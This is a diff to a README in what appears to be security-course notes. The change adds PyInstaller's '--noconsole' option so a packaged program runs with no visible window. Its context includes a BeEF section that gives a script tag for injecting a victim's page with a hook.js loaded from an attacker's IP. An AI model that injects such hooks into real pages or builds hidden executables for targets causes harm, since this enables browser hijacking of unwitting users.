@@ -31,11 +31,13 @@ On Windows, while having both Python 2 and 3 installed, we can force to run eith
 where `<version>` can be '2' or '3'.
 
 In order to package Python scripts into executable files, you need to have "pyinstaller" installed
- and ou have to run the following command:
-`pyinstaller <script_name.py> --onefile`  
-You might need to use a path to "pyinstaller" instead, if it's not added to PATH.  
-`--onefile` argument ensures all the required libraries and files are put into **single** executable.  
-The created executable can be found in the "dist" folder.
+ and ou have to run the following command:  
+`pyinstaller <script_name.py> --onefile --noconsole`  
+* You might need to use a path to "pyinstaller" instead, if it's not added to PATH.  
+* `--onefile` argument ensures all the required libraries and files are put into **single** executable.  
+* `--noconsole` argument disables console, so when we run the program, no terminal shows up. Please note that some
+Python scripts may require "stdin", "stdout" and "stderr" to be handled properly (it is handled in our program).  
+* The created executable can be found in the "dist" folder.
 ### BeEF
 The code we want to inject into our victim is:  
 `<script src="http://<IP>:3000/hook.js"></script`,  
